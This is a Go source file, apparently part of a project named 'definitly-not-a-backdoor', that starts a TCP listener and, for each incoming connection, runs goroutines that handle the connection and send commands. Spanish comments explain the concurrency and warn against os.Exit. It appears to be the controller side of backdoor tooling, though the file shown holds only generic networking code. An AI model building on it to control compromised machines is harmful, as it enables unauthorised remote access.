package tcpConnection

import (
	"fmt"
	"net"
	"os"

	"github.com/bruh-boys/definitly-not-a-backdoor/config"
	"github.com/bruh-boys/definitly-not-a-backdoor/other"
)

func StartServer() {

	other.PrintMessage("Server waiting connections on " + config.ConnHost + ":" + config.ConnPort + " (Connection type: " + config.ConnType + ")")

	l, err := net.Listen(config.ConnType, config.ConnHost+":"+config.ConnPort)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1) // los os.Exit hay que evitarlos lo mas posible
		// si estas manejando un servidor tcp o lo que sea no es buena idea
		// hacer eso ya que en general suele haber muchos errores al menejar las conexiones y eso
		// solo esuna recomendacion
	}
	defer l.Close()
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting:", err.Error())
			return
		}

		//hago esto para que se ejecute en un nuevo hilo
		// asi se ejecuta de manera simultanea
		// asi que eres capaz de manejar lo que te envia el cliente
		//al mismo tiempo que manejas lo que recibes del cliente
		go handleConnection(conn)
		go sendCommands(conn)

	}

}
